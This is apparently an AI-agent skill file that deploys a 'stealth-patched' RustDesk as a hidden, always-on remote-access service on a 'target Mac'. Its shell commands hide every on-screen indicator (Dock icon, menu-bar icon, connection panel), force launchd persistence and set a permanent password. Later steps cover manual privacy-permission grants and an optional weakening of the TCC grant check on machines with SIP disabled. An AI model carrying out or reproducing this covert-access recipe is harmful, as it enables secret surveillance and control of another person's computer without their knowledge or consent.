---
name: deploy-stealth-rustdesk
description: Deploy a prebuilt stealth-patched RustDesk.app as an unattended macOS LaunchAgent service — no Dock icon, no menu-bar icon, no on-screen CM panel, remote keyboard still works, survives reboot with nobody logged in. Use when installing a stealth RustDesk on a target Mac; build the app first with the build-stealth-rustdesk skill.
disable-model-invocation: true
---

# Deploy stealth RustDesk as an unattended macOS service

Install a **stealth-patched, signed `RustDesk.app`** as an always-on service: unattended remote access with three stealth surfaces suppressed — the **Dock icon**, the **menu-bar (tray) icon**, and the **CM panel** (the connection-management window that floats top-right during a session) — while remote **keyboard** works, surviving reboot with nobody logged in.

**Precondition — the app must come from `build-stealth-rustdesk`.** This skill deploys a bundle that already has the `tray.rs` / `window_manager` / `ipc.rs` patches compiled in and is codesigned. A stock RustDesk will **not** work here: its CM panel can't be hidden (the Pro/custom-client gate is still compiled in), and an `hide-tray=Y` custom-client build springs the **daemon trap** (LaunchDaemon outside the GUI session → dead remote keyboard, [rustdesk#10709](https://github.com/rustdesk/rustdesk/issues/10709)). Two build-time facts this skill leans on:

- **`ipc.rs` gate removal** — makes Step 2's three hide-CM options actually take effect; on a stock build they are silently ignored.
- **Signing identity** — if the app was ad-hoc signed, the Step 3 TCC grants break on every rebuild (`Connected, waiting for image`); a stable self-signed identity makes them survive. See `build-stealth-rustdesk` → Codesign / "Stable signing identity".

A non-visual essential of its own: the agent's `KeepAlive` must be forced to always-restart (Step 1), or a clean exit (e.g. closing a GUI window) leaves it down and remote access silently dies.

From `build-stealth-rustdesk`'s hand-off you staged three things on this Mac: the signed `RustDesk.app` and the two launchd plists (they are **not** inside the .app bundle). The defaults below match the `~/.stealth-rustdesk` layout that skill stages — point them at wherever you copied the folder:

```bash
APP=~/.stealth-rustdesk/RustDesk.app                 # the signed artifact you copied over
PLISTS=~/.stealth-rustdesk/privileges_scripts        # holds daemon.plist + agent.plist
```

## Step 1 — Install as LaunchAgent + daemon

Copy to `/Applications`, install both plists (root:wheel), load the root daemon, bootstrap the user agent into the GUI session:

```bash
sudo rm -rf /Applications/RustDesk.app && sudo cp -R "$APP" /Applications/RustDesk.app
sudo chown -R root:wheel /Applications/RustDesk.app
sudo cp "$PLISTS/daemon.plist" /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
sudo cp "$PLISTS/agent.plist"  /Library/LaunchAgents/com.carriez.RustDesk_server.plist
sudo chown root:wheel /Library/LaunchDaemons/com.carriez.RustDesk_service.plist /Library/LaunchAgents/com.carriez.RustDesk_server.plist
# Agent resilience: the stock agent KeepAlive restarts only on FAILURE (a dict with
# SuccessfulExit=false), so a *clean* exit (e.g. when a GUI window is closed) leaves the
# agent down and remote access silently dies. Force always-restart so it self-heals.
sudo /usr/libexec/PlistBuddy -c "Delete :KeepAlive" -c "Add :KeepAlive bool true" /Library/LaunchAgents/com.carriez.RustDesk_server.plist
sudo launchctl load -w /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
launchctl bootstrap gui/$(id -u) /Library/LaunchAgents/com.carriez.RustDesk_server.plist
```

The **agent** (`RustDesk --server`, runs in the Aqua/LoginWindow session) is what makes screen capture + keyboard injection work — the whole point of not being a daemon-only install. With stock `KeepAlive` it can exit cleanly and never restart, so remote access only works while some window is open; the `KeepAlive=true` edit above makes it always-on and window-independent.

**Done when:** both labels show `state = running`, and the agent stays up on its own — kill it (`pkill -f 'MacOS/RustDesk --server'`), wait 2s, and confirm launchd respawned it.

## Step 2 — Password, identity sync, hide the CM panel

Order matters — the password IPC needs the service running; the config edits need it stopped.

```bash
# 1. permanent password (needs root + installed) — RETRY until "Done!": the service IPC
#    socket may not be ready right after start, and "Connection refused" means not-ready,
#    NOT failure. This must succeed here (see verification-method warning below).
until sudo /Applications/RustDesk.app/Contents/MacOS/RustDesk --password 'YOUR_STRONG_PASSWORD' 2>&1 | grep -q '^Done'; do sleep 1; done
# 2. stop both so edits are not overwritten:
launchctl bootout gui/$(id -u)/com.carriez.RustDesk_server; sudo launchctl bootout system/com.carriez.RustDesk_service
# 3. sync identity+password daemon(root) -> agent(user) so enc_id/key match:
sudo cp /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk.toml  ~/Library/Preferences/com.carriez.RustDesk/RustDesk.toml
sudo cp /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml ~/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml
sudo chown $(id -u):$(id -g) ~/Library/Preferences/com.carriez.RustDesk/RustDesk*.toml
# 4. hide the CM panel — all 3 required (and are the correct unattended posture) — in BOTH configs' [options] (last section, so append is safe):
for f in /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml ~/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml; do
  printf "approve-mode = 'password'\nverification-method = 'use-permanent-password'\nallow-hide-cm = 'Y'\n" | sudo tee -a "$f" >/dev/null
done
# 5. restart both:
sudo launchctl load -w /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
launchctl bootstrap gui/$(id -u) /Library/LaunchAgents/com.carriez.RustDesk_server.plist
```

`hide_cm()` requires all three: `approve-mode=password` **and** `verification-method=use-permanent-password` **and** `allow-hide-cm=Y` — and they only take effect because `build-stealth-rustdesk`'s `ipc.rs` hunk removed the Pro/custom-client gate; on a stock build these are silently ignored. The permanent password is stored (hashed) in the `password` field of `RustDesk.toml`, not RustDesk2.toml.

**Critical ordering:** a valid permanent password must exist (step 1 succeeded) *before* the service restarts with `verification-method=use-permanent-password`. If it starts "permanent-only but no password", RustDesk normalizes `verification-method` back to `use-both-passwords`, which makes `hide_cm()` false and the CM panel returns. If after restart `verification-method` reads `use-both-passwords`, the password wasn't set — set it, then `sed -i '' "s/^verification-method = .*/verification-method = 'use-permanent-password'/"` both `RustDesk2.toml` and restart.

**Done when:** root and user `RustDesk.toml` share the same `enc_id`; both `RustDesk2.toml` carry the three options; and `verification-method` still reads `use-permanent-password` ~5s after restart (did not revert).

## Step 3 — Grant permissions (manual, unavoidable)

macOS forbids scripting TCC. Over a GUI session (VNC / Screen Sharing / console), grant **RustDesk** in System Settings ▸ Privacy & Security: **Screen & System Audio Recording**, **Accessibility**, **Input Monitoring**. Then restart both services so they pick up the grants:
`launchctl kickstart -k gui/$(id -u)/com.carriez.RustDesk_server && sudo launchctl kickstart -k system/com.carriez.RustDesk_service`.

**Done when:**
```bash
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
  "select service,auth_value from access where client='com.carriez.rustdesk';"
```
lists `kTCCServiceScreenCapture`, `kTCCServiceAccessibility`, `kTCCServiceListenEvent` all `= 2`.

**Rebuild redeploys (ad-hoc signing):** the old grants are bound to the previous signature — they still read `= 2` but silently fail (`Connected, waiting for image`). `sudo tccutil reset ScreenCapture com.carriez.rustdesk` (+ `Accessibility`, `ListenEvent`), restart both labels, re-grant. A **stable signing identity** at build time avoids this entirely — see `build-stealth-rustdesk` → "Stable signing identity". **SIP-off shortcut:** if SIP is disabled on the target, instead of re-granting you can rewrite the grant's stored `csreq` from the exact cdhash to `identifier "com.carriez.rustdesk"` once — it then matches *any* ad-hoc rebuild by bundle id, so grants survive without a re-grant (weaker check; commands in `REFERENCE.md` → "Make ad-hoc TCC grants survive rebuilds").

## Step 4 — Verify the payoff (all must hold)

Test with **no RustDesk window open** — a correct deployment runs only `service` + `--server`.

- **Stealth:** menu bar has no RustDesk item; **no Dock icon appears when a session connects** (the window_manager fix — verify *visually* over the screen session; `lsappinfo` reports `type="UIElement"` even while a Dock icon is showing, so it is NOT a reliable check here); no floating CM panel during a session.
- **Function (from a second machine, host has no window open):** connect to the ID (`.../RustDesk --get-id`) with the password → screen appears, mouse works, and **keyboard works**. That it works with nothing open confirms the agent is self-standing.
- **Persistence:** reboot with nobody logged in → reconnect succeeds.

Keyboard working proves the approach — if it fails you are in the **daemon trap** (agent not in the user session), or the app wasn't built by `build-stealth-rustdesk`. If it works *only while a window is open*, the agent's `KeepAlive` isn't `true` (Step 1). See `REFERENCE.md`.

## Maintenance & rollback

Uninstall, redeploying a rebuilt app, and connection/stealth troubleshooting are in **`REFERENCE.md`**. Building or version-bumping the app itself is the `build-stealth-rustdesk` skill.
